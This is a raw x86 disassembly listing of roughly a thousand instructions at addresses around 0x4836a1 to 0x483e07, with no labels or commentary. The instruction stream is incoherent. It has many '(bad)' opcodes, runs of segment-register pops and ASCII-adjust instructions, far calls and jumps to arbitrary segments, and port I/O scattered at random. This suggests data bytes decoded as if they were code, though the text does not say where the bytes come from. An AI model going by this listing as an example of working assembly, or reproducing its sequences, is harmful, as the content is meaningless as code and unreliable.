  4836a1:	fisttp DWORD PTR [eax+0x1f6483b5]
  4836a7:	dec    edi
  4836a8:	pop    ds
  4836a9:	jbe    0x48365c
  4836ab:	mov    ebx,DWORD PTR [ebp+0x33]
  4836ae:	jg     0x4836e2
  4836b0:	pop    ds
  4836b1:	xor    DWORD PTR [edi-0x4a],ebx
  4836b4:	cmp    BYTE PTR [esi+0x1f31ff2d],ah
  4836ba:	pop    edi
  4836bb:	fadd   st,st(5)
  4836bd:	cs fs inc esi
  4836c0:	inc    ebp
  4836c1:	pop    ds
  4836c2:	inc    esp
  4836c3:	mov    edi,0xb92c75b7
  4836c8:	inc    ebx
  4836c9:	lahf   
  4836ca:	aas    
  4836cb:	xor    al,cl
  4836cd:	test   DWORD PTR [eax+ecx*8+0x0],ebx
  4836d1:	inc    ecx
  4836d2:	cmp    DWORD PTR [eax],edi
  4836d4:	pop    es
  4836d5:	and    DWORD PTR [edi-0x5e],ebp
  4836d8:	pop    edx
  4836d9:	pop    ds
  4836da:	xor    ebx,DWORD PTR [esi]
  4836dc:	inc    ebp
  4836dd:	sbb    ebx,DWORD PTR [eax]
  4836df:	push   ss
  4836e0:	jb     0x483712
  4836e2:	pop    ds
  4836e3:	xor    edi,DWORD PTR [edi-0x13a36968]
  4836e9:	xor    ebx,DWORD PTR [edi]
  4836eb:	xor    bh,BYTE PTR [edi]
  4836ed:	sbb    ebp,DWORD PTR [esi+ecx*4]
  4836f0:	xchg   edi,eax
  4836f1:	jg     0x483712
  4836f3:	pop    edx
  4836f4:	aas    
  4836f5:	sub    eax,0x461762e4
  4836fa:	pop    ds
  4836fb:	inc    ebp
  4836fc:	mov    ebx,0xff74c85c
  483701:	xor    esi,DWORD PTR [ebx]
  483703:	inc    edx
  483704:	aas    
  483705:	mov    bl,ah
  483707:	bound  edx,QWORD PTR [edi]
  483709:	cmp    DWORD PTR [edi+0x38],edi
  48370c:	pop    ds
  48370d:	pop    ss
  48370e:	shl    DWORD PTR ds:0x453e34ef,cl
  483714:	xor    al,0x1f
  483716:	xor    al,0x58
  483718:	xor    bl,BYTE PTR [ebx+0xc]
  48371b:	pop    ds
  48371c:	pop    ds
  48371d:	xor    eax,0xfb1762e4
  483722:	aas    
  483723:	aas    
  483724:	xor    edi,DWORD PTR [edi-0x3b212ccf]
  48372a:	mov    cl,0x1f
  48372c:	xor    eax,0x5a355f3f
  483731:	lods   al,BYTE PTR ds:[esi]
  483732:	pop    ebx
  483733:	pop    esp
  483734:	pop    ds
  483735:	pop    ds
  483736:	ss jg  0x48371d
  483739:	xchg   edx,eax
  48373a:	addr16 pusha 
  48373c:	lahf   
  48373d:	xor    al,0x41
  48373f:	xor    al,0xc1
  483741:	bound  edx,QWORD PTR [ebx]
  483743:	sub    al,0x3f
  483745:	inc    ecx
  483746:	pop    ds
  483747:	pop    es
  483748:	mov    ds:0x7f58045b,al
  48374d:	pop    ds
  48374e:	inc    ebp
  48374f:	xchg   DWORD PTR [ecx],esp
  483751:	jae    0x4836ff
  483753:	fistp  WORD PTR [edi+0x35]
  483756:	push   esi
  483757:	sub    al,0x82
  483759:	add    edi,DWORD PTR [ecx+0x1e]
  48375c:	xor    edi,DWORD PTR [eax]
  48375e:	pop    edi
  48375f:	outs   dx,BYTE PTR ds:[esi]
  483760:	and    BYTE PTR [edi+0x351f9f75],dh
  483766:	or     ch,ah
  483768:	bound  edx,QWORD PTR [ebx]
  48376a:	pop    es
  48376b:	pop    edi
  48376c:	inc    ebx
  48376d:	lahf   
  48376e:	ss pop ds
  483770:	mov    cl,0xc7
  483772:	dec    eax
  483773:	pop    ebx
  483774:	jg     0x4837e9
  483776:	inc    esp
  483777:	pop    ds
  483778:	pop    edx
  483779:	pop    esp
  48377a:	pop    es
  48377b:	jb     0x4837c2
  48377d:	inc    ebp
  48377e:	fisttp WORD PTR [eax+0x71]
  483781:	pusha  
  483782:	test   al,0x1f
  483784:	cmp    BYTE PTR [edi-0x45],bl
  483787:	fadd   st,st(5)
  483789:	out    0x17,al
  48378b:	inc    esp
  48378c:	inc    DWORD PTR [edx+0x1f]
  48378f:	inc    ecx
  483790:	pop    edi
  483791:	sub    eax,esi
  483793:	bound  edx,QWORD PTR [edi]
  483795:	cmp    DWORD PTR [edi],ebx
  483797:	iret   
  483798:	lods   al,BYTE PTR ds:[esi]
  483799:	pop    ebp
  48379a:	inc    esp
  48379b:	push   edi
  48379c:	pop    edi
  48379d:	pop    ds
  48379e:	aaa    
  48379f:	aas    
  4837a0:	pushf  
  4837a1:	clc    
  4837a2:	xor    BYTE PTR [ecx+0x1f],dh
  4837a5:	inc    esi
  4837a6:	fwait
  4837a7:	xor    eax,0x831d6d57
  4837ac:	dec    ebp
  4837ad:	xor    al,0x1f
  4837af:	mov    edi,0x61b0563f
  4837b4:	leave  
  4837b5:	xor    bl,BYTE PTR [ebx]
  4837b7:	pop    ds
  4837b8:	cs jbe 0x483780
  4837bb:	sbb    bl,BYTE PTR [edi]
  4837bd:	jg     0x483804
  4837bf:	aas    
  4837c0:	inc    esp
  4837c1:	mov    bh,0x6d
  4837c3:	rcr    BYTE PTR [edx],1
  4837c5:	psubq  mm1,QWORD PTR [ebx]
  4837c8:	pop    ds
  4837c9:	rol    DWORD PTR [ebp+0x3332c85c],0x34
  4837d0:	fisttp WORD PTR [esi]
  4837d2:	in     al,0x62
  4837d4:	pop    ss
  4837d5:	xor    eax,0x4b32361f
  4837da:	lds    edi,FWORD PTR [ebx-0x78bec0e8]
  4837e0:	pop    ss
  4837e1:	aas    
  4837e2:	rol    DWORD PTR [eax+0x6e],1
  4837e5:	pop    eax
  4837e6:	pop    ds
  4837e7:	cmp    DWORD PTR [edi+0x3145b91],ebx
  4837ed:	inc    esi
  4837ee:	aas    
  4837ef:	pop    ds
  4837f0:	(bad)  
  4837f1:	fadd   st,st(5)
  4837f3:	jo     0x483850
  4837f5:	aas    
  4837f6:	inc    esp
  4837f7:	aas    
  4837f8:	inc    ebp
  4837f9:	pop    ds
  4837fa:	dec    eax
  4837fb:	jno    0x483829
  4837fd:	xor    BYTE PTR [esi],bl
  4837ff:	pop    ds
  483800:	and    eax,0x5f322b1f
  483805:	aas    
  483806:	(bad)  
  483807:	xor    al,0x33
  483809:	or     ebp,DWORD PTR [ebp-0x37]
  48380c:	inc    ebp
  48380d:	add    ebx,DWORD PTR [edi+0x38]
  483810:	in     al,0xa2
  483812:	mov    eax,0x35df31d8
  483817:	lahf   
  483818:	aaa    
  483819:	sub    dh,BYTE PTR [ecx]
  48381b:	jo     0x483829
  48381d:	pop    ds
  48381e:	inc    edx
  48381f:	lahf   
  483820:	ss inc eax
  483822:	mov    al,ds:0x3f431fdb
  483827:	cmp    BYTE PTR [edi],bl
  483829:	mov    ecx,0x36390b90
  48382e:	cmp    BYTE PTR [edx],dh
  483830:	xor    BYTE PTR [ebp-0x7b],al
  483833:	or     edi,DWORD PTR [ecx]
  483835:	ja     0x483878
  483837:	cwde   
  483838:	nop
  483839:	dec    ecx
  48383a:	mov    bl,dh
  48383c:	inc    ebp
  48383d:	inc    ecx
  48383e:	inc    ecx
  48383f:	ins    DWORD PTR es:[edi],dx
  483840:	add    eax,0x3f1f9548
  483845:	pop    ds
  483846:	xor    DWORD PTR [edi+eax*2],ebp
  483849:	sbb    DWORD PTR [edi-0x5eeaa0c7],0x5f421de0
  483853:	pop    es
  483854:	mov    edi,0x20990302
  483859:	pop    ds
  48385a:	inc    ecx
  48385b:	mov    ecx,0xdfae27d8
  483860:	inc    ecx
  483861:	mov    edi,0xd55371f
  483866:	or     BYTE PTR [ebx],0x36
  483869:	pop    ds
  48386a:	fild   WORD PTR [ebx+0x1c]
  48386d:	addr16 mov esp,0x391fae3f
  483873:	dec    ecx
  483874:	bound  edi,QWORD PTR es:[edi+edi*8+0x37]
  483879:	pop    ds
  48387a:	cmp    DWORD PTR [esi+0x3f054c75],eax
  483880:	xor    BYTE PTR [edi-0x61],bh
  483883:	mov    ch,0x89
  483885:	sub    eax,0x43ff4564
  48388a:	pop    edi
  48388b:	add    edx,DWORD PTR [ebx-0x16]
  48388e:	les    edi,FWORD PTR [ecx]
  483890:	lahf   
  483891:	fbstp  TBYTE PTR ds:0x7c85c6a2
  483897:	pop    ds
  483898:	inc    ecx
  483899:	cmp    DWORD PTR [edi+0x61a0e830],ebx
  48389f:	xor    ebx,edi
  4838a1:	inc    ebp
  4838a2:	ja     0x4838dc
  4838a4:	sub    BYTE PTR [ecx+0x48],0x5f
  4838a8:	xor    eax,0x2e423507
  4838ad:	in     al,0x62
  4838af:	push   DWORD PTR [esi]
  4838b1:	ss imul eax,esp,0xffffff92
  4838b5:	fnstcw WORD PTR [edi]
  4838b7:	aaa    
  4838b8:	inc    DWORD PTR [eax-0x7a]
  4838bb:	outs   dx,BYTE PTR ds:[esi]
  4838bc:	ins    BYTE PTR es:[edi],dx
  4838bd:	pop    edi
  4838be:	push   DWORD PTR [edx]
  4838c0:	and    eax,0xff40ec02
  4838c5:	inc    edi
  4838c6:	lods   al,BYTE PTR ds:[esi]
  4838c7:	sub    dh,BYTE PTR [ecx+ebx*4-0x41]
  4838cb:	inc    esp
  4838cc:	ss mov bh,0x86
  4838cf:	add    DWORD PTR [ecx+0x3845bf26],ebx
  4838d5:	inc    edi
  4838d7:	add    al,0xb
  4838d9:	mov    ecx,0x1f42df35
  4838de:	int3   
  4838df:	mov    ch,0xd8
  4838e1:	adc    DWORD PTR [edi+ebx*4+0x5f],eax
  4838e5:	xor    BYTE PTR [ebx],dl
  4838e7:	push   edi
  4838e8:	test   DWORD PTR [ecx-0x7e55ba81],eax
  4838ee:	pop    esp
  4838ef:	in     al,dx
  4838f0:	jg     0x483951
  4838f2:	xor    al,0x83
  4838f4:	les    esi,FWORD PTR [ecx+0x375fdae4]
  4838fa:	pop    ds
  4838fb:	push   ecx
  4838fc:	arpl   WORD PTR [edx-0x3c],sp
  4838ff:	inc    esp
  483900:	inc    DWORD PTR [edi+ebx*2+0x6c]
  483904:	or     dl,BYTE PTR [esi+0x31]
  483907:	inc    esp
  483908:	mov    edi,0xc31f375f
  48390d:	daa    
  48390e:	xchg   esi,eax
  48390f:	pop    esp
  483910:	cmp    BYTE PTR [edi+0x62e183bf],bl
  483916:	adc    eax,DWORD PTR [edx-0x61]
  483919:	inc    ebx
  48391a:	minps  xmm5,XMMWORD PTR [ebx+0x48]
  48391e:	mov    al,ds:0xdff3f335
  483923:	sbb    DWORD PTR [esi+0x1f0a06a1],ebp
  483929:	inc    edx
  48392a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48392b:	rcr    esi,1
  48392d:	and    bh,bl
  48392f:	pop    ds
  483930:	or     esi,DWORD PTR [edx+edi*4]
  483933:	jne    0x483994
  483935:	aaa    
  483936:	pop    ds
  483937:	test   DWORD PTR [esp+ebp*2+0x68],ebx
  48393b:	push   DWORD PTR ds:0xb92433f
  483941:	mov    ecx,0x311f34d8
  483946:	xlat   BYTE PTR ss:[ebx]
  483948:	(bad)  
  483949:	xor    DWORD PTR [ecx],edi
  48394b:	xor    BYTE PTR [edi],bl
  48394d:	aas    
  48394e:	inc    esp
  48394f:	mov    ch,0x16
  483951:	and    BYTE PTR ds:0x72471fe3,0x30
  483958:	sbb    al,0x56
  48395a:	pop    ds
  48395b:	xor    al,BYTE PTR [ebp-0x7c]
  48395e:	mov    ah,0xe5
  483960:	pusha  
  483961:	jg     0x483996
  483963:	aas    
  483964:	sub    eax,0x5e6d6074
  483969:	aas    
  48396a:	pop    edi
  48396b:	aaa    
  48396c:	cmp    al,0x20
  48396e:	rol    DWORD PTR [ecx+0x34397f],cl
  483974:	inc    ecx
  483975:	scas   al,BYTE PTR es:[edi]
  483976:	inc    ebp
  483977:	xor    BYTE PTR [eax+0x427bdf33],dl
  48397d:	mov    esp,ecx
  48397f:	ficomp DWORD PTR [edi+0x70085f44]
  483985:	or     BYTE PTR [ebp-0x18cbb129],ch
  48398b:	mov    ebx,0x45e84387
  483990:	xchg   DWORD PTR [edi-0x72d1ed92],esp
  483996:	repz (bad) 
  483998:	aaa    
  483999:	jg     0x483925
  48399b:	mov    bl,0xc4
  48399d:	adc    BYTE PTR [edx+edi*8+0x42573837],dl
  4839a4:	adc    BYTE PTR [eax+ebp*2],0x62
  4839a8:	lahf   
  4839a9:	inc    edx
  4839aa:	lahf   
  4839ab:	fcmovnbe st,st(5)
  4839ad:	enter  0x4752,0x1f
  4839b1:	pop    DWORD PTR [esi+0x1f]
  4839b4:	or     esi,DWORD PTR [eax-0x20b09ef7]
  4839ba:	das    
  4839bb:	test   BYTE PTR [edi+0x7c],al
  4839be:	jge    0x483a1f
  4839c0:	xor    ebx,ebp
  4839c2:	push   edx
  4839c3:	xor    DWORD PTR [eax],esp
  4839c5:	and    ebp,DWORD PTR [eax]
  4839c7:	inc    ebx
  4839c8:	jg     0x4839fa
  4839ca:	and    ebp,DWORD PTR [ecx]
  4839cc:	cld    
  4839cd:	pop    eax
  4839ce:	call   0x87d3:0x357b312a
  4839d5:	test   DWORD PTR [eax-0x63],ebp
  4839d8:	aaa    
  4839d9:	aas    
  4839da:	inc    ebx
  4839db:	ss cs pusha 
  4839de:	aam    0x1a
  4839e0:	enter  0x8733,0x2e
  4839e4:	or     BYTE PTR [ebx],0x99
  4839e7:	(bad)  
  4839e9:	xor    ebx,DWORD PTR [edi]
  4839eb:	xor    al,0x18
  4839ed:	test   BYTE PTR [esi+0x4e036f08],dh
  4839f3:	mov    cl,0xde
  4839f5:	fisubr DWORD PTR [eax]
  4839f7:	outs   dx,DWORD PTR ds:[esi]
  4839f8:	iret   
  4839f9:	outs   dx,DWORD PTR ds:[esi]
  4839fa:	pop    ds
  4839fb:	pop    esp
  4839fc:	and    edx,DWORD PTR [ebx+ebx*2]
  4839ff:	jg     0x483a70
  483a01:	xchg   ebx,eax
  483a02:	fcmovne st,st(1)
  483a04:	xor    al,0x5f
  483a06:	inc    esp
  483a07:	outs   dx,DWORD PTR ss:[esi]
  483a09:	xor    al,0x5a
  483a0b:	inc    ecx
  483a0c:	test   al,0x9d
  483a0e:	xor    ebp,DWORD PTR [edi+0x6b041507]
  483a14:	sub    edi,DWORD PTR [edi-0x71]
  483a17:	das    
  483a18:	bound  edi,QWORD PTR [eax+0x7f39db90]
  483a1e:	ss inc ebp
  483a20:	(bad)  
  483a21:	mov    cs,WORD PTR [ebx+0x37cfd861]
  483a27:	rdpmc  
  483a29:	andnps xmm6,XMMWORD PTR [eax+0x6f382edc]
  483a30:	inc    edx
  483a31:	aas    
  483a32:	sub    al,0x99
  483a34:	lea    ecx,[ebp+0x37]
  483a37:	pop    ds
  483a38:	mov    edi,0xc41c7735
  483a3d:	push   esi
  483a3e:	pop    ss
  483a3f:	lahf   
  483a40:	inc    esp
  483a41:	das    
  483a42:	aaa    
  483a43:	or     BYTE PTR fs:[esi-0x44cbe0db],0x82
  483a4b:	aaa    
  483a4c:	xor    DWORD PTR cs:[ebx+0x3],edx
  483a50:	(bad)  
  483a51:	repnz sub al,0x55
  483a54:	pop    eax
  483a55:	pop    edi
  483a56:	aas    
  483a57:	inc    esi
  483a58:	add    BYTE PTR [ecx],bh
  483a5a:	pop    ss
  483a5b:	jb     0x483a7e
  483a5d:	pop    es
  483a5e:	xor    esi,DWORD PTR ds:0x7545a732
  483a64:	and    DWORD PTR [edx-0x61],eax
  483a67:	mov    ds:0x712c4d,al
  483a6c:	push   edi
  483a6d:	aas    
  483a6e:	cmp    BYTE PTR [ecx],ah
  483a70:	pop    ss
  483a71:	shr    BYTE PTR [ebp+0x37333f7f],cl
  483a77:	mov    dh,0xd8
  483a79:	inc    ebp
  483a7a:	jno    0x483aad
  483a7c:	aas    
  483a7d:	ss aas 
  483a7f:	mov    esi,0x862c0a0c
  483a84:	xor    eax,0xc85d574f
  483a89:	mov    ah,0x27
  483a8b:	(bad)  
  483a8c:	jg     0x483ad1
  483a8e:	inc    edx
  483a8f:	dec    eax
  483a90:	cs xchg edx,eax
  483a92:	mov    edi,DWORD PTR [edi]
  483a94:	inc    edx
  483a95:	inc    ecx
  483a96:	dec    ebp
  483a97:	push   eax
  483a98:	sub    eax,0x393739b9
  483a9d:	enter  0x56c1,0x8c
  483aa1:	aas    
  483aa2:	xchg   DWORD PTR [edi-0x78966fba],edi
  483aa8:	pop    edx
  483aa9:	fistp  QWORD PTR [edi]
  483aab:	inc    ebp
  483aac:	and    ebx,edx
  483aae:	mov    ?,WORD PTR [edi+edi*1-0x7276bbc1]
  483ab5:	inc    edx
  483ab6:	pusha  
  483ab7:	jg     0x483ab8
  483ab9:	xchg   ebp,eax
  483aba:	fsub   DWORD PTR [edx-0xcdb998]
  483ac0:	aas    
  483ac1:	jb     0x483ae4
  483ac3:	ror    DWORD PTR [esi],cl
  483ac5:	lahf   
  483ac6:	aas    
  483ac7:	xor    bh,BYTE PTR [ecx]
  483ac9:	or     BYTE PTR [eax+0x21],dh
  483acc:	pop    ss
  483acd:	xor    DWORD PTR [eax],edi
  483acf:	inc    edi
  483ad0:	sbb    al,0xec
  483ad2:	push   ss
  483ad3:	mov    ebx,0x7f9e3f38
  483ad8:	aaa    
  483ad9:	fadd   st,st(5)
  483adb:	lods   eax,DWORD PTR ds:[esi]
  483adc:	test   edi,ebx
  483ade:	ss aas 
  483ae0:	cs in  al,0x40
  483ae3:	mov    esi,0x35330042
  483ae8:	inc    esi
  483ae9:	cmp    BYTE PTR [edx+0x70],ah
  483aec:	jecxz  0x483ab0
  483aee:	mov    edi,0xa3d7e122
  483af3:	push   ss
  483af4:	jp     0x483ae8
  483af6:	inc    ecx
  483af7:	fild   WORD PTR [esi-0x20]
  483afa:	or     DWORD PTR ds:0x5744abf4,ebp
  483b00:	xor    ebp,ebx
  483b02:	inc    edi
  483b03:	cmp    eax,0x32ea54a0
  483b08:	push   ss
  483b09:	out    0x5d,al
  483b0b:	add    ch,cl
  483b0d:	adc    ebp,DWORD PTR [esi]
  483b0f:	xor    edi,ebx
  483b11:	jbe    0x483b7d
  483b13:	test   al,0x2b
  483b15:	cmp    eax,0x59e21b8f
  483b1a:	sub    BYTE PTR [eax-0x22],bl
  483b1d:	sub    bh,BYTE PTR [esi]
  483b1f:	inc    ebp
  483b20:	jg     0x483b41
  483b22:	loopne 0x483b2d
  483b24:	outs   dx,DWORD PTR ds:[esi]
  483b25:	add    eax,0x13345607
  483b2a:	outs   dx,DWORD PTR ds:[esi]
  483b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483b2c:	dec    ebx
  483b2d:	jp     0x483ae5
  483b2f:	ds ss inc edx
  483b32:	pop    es
  483b33:	inc    edi
  483b34:	call   0x347e441b
  483b39:	das    
  483b3a:	and    eax,DWORD PTR [edi+0x78]
  483b3d:	test   esi,0xe7a62336
  483b43:	xor    al,BYTE PTR [esp+edi*2-0x41]
  483b47:	mov    esi,0x8ff6db7b
  483b4c:	xor    DWORD PTR [edi-0x25ccf8c8],ecx
  483b52:	lock or BYTE PTR ds:0x9f467297,bl
  483b59:	xor    DWORD PTR ds:0x347642ef,ebx
  483b5f:	lahf   
  483b60:	pop    ds
  483b61:	aaa    
  483b62:	sahf   
  483b63:	je     0x483b90
  483b65:	mov    esi,0x938a4793
  483b6a:	mov    esp,0xfe27bc07
  483b6f:	pop    ds
  483b70:	dec    esi
  483b71:	inc    ebx
  483b72:	aas    
  483b73:	push   ss
  483b74:	mov    esp,0xbfb766c2
  483b79:	inc    esp
  483b7a:	outs   dx,DWORD PTR ds:[esi]
  483b7b:	lock cmp eax,0x22cf3161
  483b81:	inc    esp
  483b82:	dec    edi
  483b83:	aaa    
  483b84:	ins    BYTE PTR es:[edi],dx
  483b85:	clc    
  483b86:	push   es
  483b87:	cdq    
  483b88:	arpl   WORD PTR [esi-0x11],cx
  483b8b:	xor    edi,DWORD PTR [ebx+0x75]
  483b8e:	jge    0x483b56
  483b90:	cmp    eax,edx
  483b92:	cmp    esi,DWORD PTR [edi]
  483b94:	inc    esp
  483b95:	aas    
  483b96:	add    ebx,DWORD PTR [esi]
  483b98:	out    0xd6,al
  483b9a:	ss mov edi,0xb0826b41
  483ba0:	clc    
  483ba1:	cmp    BYTE PTR [ebx-0x6db4a909],al
  483ba7:	leave  
  483ba8:	shr    DWORD PTR [ebp+0x3341dbf8],0x82
  483baf:	sub    dh,BYTE PTR [edx]
  483bb1:	cmp    DWORD PTR [ebx],0x3a
  483bb4:	sbb    DWORD PTR [ebx-0x42],0xffffffff
  483bb8:	cmp    bh,BYTE PTR [esi]
  483bba:	test   al,0x17
  483bbc:	xchg   edi,eax
  483bbd:	xchg   ebx,eax
  483bbe:	inc    ecx
  483bbf:	inc    edx
  483bc0:	inc    edx
  483bc1:	shl    DWORD PTR ds:0xd378738e,cl
  483bc7:	lahf   
  483bc8:	xor    al,0x3f
  483bca:	arpl   WORD PTR [edx-0x71f310e1],bp
  483bd0:	mov    cl,0xa3
  483bd2:	push   ebx
  483bd3:	into   
  483bd4:	ret    
  483bd5:	test   DWORD PTR [ebx],esi
  483bd7:	push   ds
  483bd8:	push   ss
  483bd9:	call   0xf06f:0xbc7a1657
  483be0:	inc    edi
  483be1:	push   0xffffffa3
  483be3:	inc    edx
  483be4:	adc    esp,DWORD PTR [edi-0x3a1c11ce]
  483bea:	xor    eax,0x334e39b
  483bef:	bound  edi,QWORD PTR [edx+0x38]
  483bf2:	loopne 0x483c12
  483bf4:	add    edi,DWORD PTR [esi+0x32]
  483bf7:	jg     0x483b7c
  483bf9:	dec    ebx
  483bfa:	or     al,0x71
  483bfc:	call   0xc1ae:0xbb77cbee
  483c03:	rol    DWORD PTR [edx+0x7f],0xd2
  483c07:	aas    
  483c08:	inc    edx
  483c09:	push   edi
  483c0a:	mov    esi,0x2dc7ef5
  483c0f:	ret    
  483c10:	ss jecxz 0x483ba6
  483c13:	push   ds
  483c14:	push   ds
  483c15:	pushf  
  483c16:	sub    al,0x83
  483c18:	ret    0x4697
  483c1b:	test   DWORD PTR [ebp+0xbe42c78],0x37aeae26
  483c25:	mov    al,0x78
  483c27:	(bad)  
  483c28:	cmp    bh,al
  483c2a:	sti    
  483c2b:	retf   0x8fd4
  483c2e:	sti    
  483c2f:	clc    
  483c30:	(bad)  [edx]
  483c32:	xchg   ebx,eax
  483c33:	add    dl,BYTE PTR [ebx]
  483c35:	xor    esp,eax
  483c37:	pusha  
  483c38:	jo     0x483bee
  483c3a:	jmp    0xe0ae:0xe85fc26b
  483c41:	lds    ebp,FWORD PTR [edx]
  483c43:	jecxz  0x483c87
  483c45:	pop    es
  483c46:	inc    esp
  483c47:	mov    dh,0x83
  483c49:	fwait
  483c4a:	push   ss
  483c4b:	out    dx,eax
  483c4c:	sar    DWORD PTR [edi],cl
  483c4e:	push   es
  483c4f:	cmp    esi,DWORD PTR [edx]
  483c51:	sbb    DWORD PTR [edi],0xffffffee
  483c54:	jmp    0x39ac1f14
  483c59:	sub    eax,DWORD PTR [edx]
  483c5b:	mov    bl,0x37
  483c5d:	jbe    0x483c62
  483c5f:	mov    ds:0xeb2ebf45,eax
  483c64:	jno    0x483c2d
  483c66:	and    edi,DWORD PTR [esi+0x1f466267]
  483c6c:	ss ret 0xe23d
  483c70:	fisttp QWORD PTR [ebx]
  483c72:	xor    cl,BYTE PTR [edi-0x79]
  483c75:	ja     0x483cbe
  483c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483c78:	push   ebx
  483c79:	push   edi
  483c7a:	mov    edi,0xefb1741
  483c7f:	mov    esi,0x360f803b
  483c84:	retf   
  483c85:	arpl   WORD PTR ss:[esi+0x261d16ef],dx
  483c8c:	scas   eax,DWORD PTR es:[edi]
  483c8d:	mov    eax,DWORD PTR ss:[esi-0x2c]
  483c91:	ror    DWORD PTR [edx-0x54],cl
  483c94:	jb     0x483c1d
  483c96:	and    ecx,DWORD PTR ds:0xdf7b838f
  483c9c:	(bad)  
  483c9d:	sbb    eax,DWORD PTR [edx]
  483c9f:	call   FWORD PTR [ebp-0x41]
  483ca2:	push   ds
  483ca3:	fild   DWORD PTR [edx-0x15]
  483ca6:	scas   al,BYTE PTR es:[edi]
  483ca7:	addr16 ss ja 0x483c2c
  483cab:	inc    ebx
  483cac:	or     bl,dh
  483cae:	inc    esp
  483caf:	pop    edi
  483cb0:	pop    es
  483cb1:	mov    ebx,0xc560d35e
  483cb6:	(bad)  
  483cb7:	mov    bh,0x41
  483cb9:	(bad)
  483cbd:	in     eax,dx
  483cbe:	vpackssdw ymm1,ymm5,YMMWORD PTR [ebx+0x42]
  483cc3:	das    
  483cc4:	xor    dl,bh
  483cc6:	in     eax,dx
  483cc7:	clc    
  483cc8:	into   
  483cc9:	popa   
  483cca:	ja     0x483c8a
  483ccc:	pop    es
  483ccd:	inc    ecx
  483cce:	sbb    esi,ebp
  483cd0:	or     eax,DWORD PTR [edi]
  483cd2:	cmp    dh,bl
  483cd4:	jnp    0x483cb9
  483cd6:	xor    bl,dh
  483cd8:	cmp    eax,0x373b5a2c
  483cdd:	(bad)
  483ce1:	and    esi,DWORD PTR [edi+0x17665b8a]
  483ce7:	aaa    
  483ce8:	repnz pop ds
  483cea:	ja     0x483c9d
  483cec:	js     0x483cb5
  483cee:	jbe    0x483ca7
  483cf0:	adc    ch,bl
  483cf2:	sbb    eax,0x5e70f857
  483cf7:	sbb    eax,DWORD PTR [ebx+0x3b]
  483cfa:	iret   
  483cfb:	pop    es
  483cfc:	js     0x483cb8
  483cfe:	rol    BYTE PTR [ebx+edx*4+0x2f],0x13
  483d03:	sahf   
  483d04:	icebp  
  483d05:	adc    BYTE PTR [edi],0x57
  483d08:	xor    eax,0x38fbf71f
  483d0d:	cli    
  483d0e:	adc    al,0x2b
  483d10:	ja     0x483d65
  483d12:	outs   dx,DWORD PTR ds:[esi]
  483d13:	and    DWORD PTR [edi],ebx
  483d15:	mov    esi,0x331b5ec1
  483d1a:	rdtsc  
  483d1c:	gs mov cl,0xbc
  483d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483d20:	dec    esi
  483d22:	inc    ebp
  483d23:	idiv   DWORD PTR [ebx-0x2a]
  483d26:	(bad)  
  483d27:	ja     0x483d5c
  483d29:	dec    ebx
  483d2a:	inc    edx
  483d2b:	retf   
  483d2c:	fild   DWORD PTR [edx+0x63]
  483d2f:	je     0x483cbe
  483d31:	(bad)  
  483d32:	fwait
  483d33:	retf   
  483d34:	into   
  483d35:	jbe    0x483d54
  483d37:	cs out dx,al
  483d39:	pop    edi
  483d3a:	cmp    dl,bh
  483d3c:	repnz daa 
  483d3e:	xchg   edi,eax
  483d40:	add    BYTE PTR [ecx],0x8a
  483d43:	dec    edi
  483d44:	ret    0xd15f
  483d47:	inc    esp
  483d48:	out    0xc5,eax
  483d4a:	aaa    
  483d4b:	outs   dx,DWORD PTR ds:[esi]
  483d4c:	xor    ebx,edi
  483d4e:	cmp    BYTE PTR [edi],al
  483d50:	repnz push esi
  483d52:	adc    ebp,0x3426577e
  483d58:	fdiv   DWORD PTR [eax+0x8]
  483d5b:	fsub   QWORD PTR [edx-0x422ee4c5]
  483d61:	(bad)  [ebp+0x72]
  483d64:	mov    bl,0xca
  483d66:	sti    
  483d67:	scas   al,BYTE PTR es:[edi]
  483d68:	pop    es
  483d69:	lock (bad) [edx-0x1dcc2939]
  483d70:	push   ebx
  483d71:	inc    esi
  483d72:	xor    DWORD PTR [edi+0x65],0xfffffff1
  483d76:	xchg   edi,eax
  483d77:	addr16 mov edi,0x796d628f
  483d7d:	xorps  xmm6,xmm3
  483d80:	push   ebx
  483d81:	cli    
  483d82:	cmp    DWORD PTR [edx+0x22374730],ecx
  483d88:	sub    eax,0x87373be7
  483d8d:	push   cs
  483d8e:	dec    edi
  483d8f:	pop    ebp
  483d90:	pusha  
  483d91:	xlat   BYTE PTR ds:[ebx]
  483d92:	and    bl,BYTE PTR [ebx]
  483d94:	jo     0x483d1b
  483d96:	not    DWORD PTR [ebx]
  483d98:	xchg   DWORD PTR [ebx+eiz*2+0x53],eax
  483d9c:	sub    al,0xc0
  483d9e:	adc    esp,DWORD PTR [ebp-0x19]
  483da1:	xchg   ebx,eax
  483da2:	fistp  QWORD PTR [esi+edx*4]
  483da5:	and    DWORD PTR [ebx],0xffffffdf
  483da8:	inc    esi
  483da9:	inc    ebx
  483daa:	outs   dx,DWORD PTR ds:[esi]
  483dab:	mov    esp,0x7bf51e85
  483db0:	dec    edi
  483db1:	cmp    dh,BYTE PTR [ebx+0x36dd76e]
  483db7:	dec    edx
  483db8:	jmp    DWORD PTR [edx-0x6288a109]
  483dbe:	lds    ecx,FWORD PTR [edx-0x248db0d9]
  483dc4:	xor    al,0x77
  483dc6:	jo     0x483d48
  483dc8:	jnp    0x483e09
  483dca:	repz out 0x3f,al
  483dcd:	mov    bl,0xab
  483dcf:	mov    ds:0x1b868717,eax
  483dd4:	inc    esp
  483dd5:	outs   dx,DWORD PTR ds:[esi]
  483dd6:	es inc esp
  483dd8:	or     dh,BYTE PTR [eax+edi*2+0x416626a3]
  483ddf:	jns    0x483e19
  483de1:	xor    dh,BYTE PTR [esi]
  483de3:	jnp    0x483e2a
  483de5:	push   cs
  483de6:	xor    BYTE PTR [edi],ch
  483de8:	js     0x483e17
  483dea:	ins    DWORD PTR es:[edi],dx
  483deb:	push   esi
  483dec:	xor    eax,0x427b6fbf
  483df1:	or     bl,dh
  483df3:	xor    eax,0xca1b0787
  483df8:	loop   0x483dea
  483dfa:	icebp  
  483dfb:	test   DWORD PTR [ebx-0x69],ebp
  483dfe:	mov    ds:0xef78312e,al
  483e03:	xchg   ebx,eax
  483e04:	outs   dx,DWORD PTR ds:[esi]
  483e05:	mov    bh,0x8a
  483e07:	ret    
